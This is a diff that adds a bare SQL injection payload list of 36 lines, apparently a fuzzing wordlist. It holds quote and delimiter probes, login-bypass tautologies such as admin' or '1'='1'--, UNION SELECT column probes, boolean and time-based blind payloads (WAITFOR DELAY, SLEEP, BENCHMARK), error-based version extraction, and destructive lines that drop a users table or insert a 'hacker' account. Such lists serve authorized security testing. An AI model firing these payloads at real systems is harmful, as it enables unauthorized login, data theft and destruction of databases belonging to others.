@@ -1,0 +1,36 @@
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'#
+' or '1'='1'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+' union select null--
+' union select null,null--
+' union select null,null,null--
+' union all select null--
+' union all select null,null--
+' and 1=1--
+' and 1=2--
+' and 'a'='a
+' and 'a'='b
+'; waitfor delay '0:0:5'--
+'; SELECT SLEEP(5)--
+'||(SELECT SLEEP(5))||'
+'; BENCHMARK(5000000,MD5('test'))--
+' and extractvalue(1,concat(0x7e,version()))--
+' and updatexml(1,concat(0x7e,version()),1)--
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','pass')--
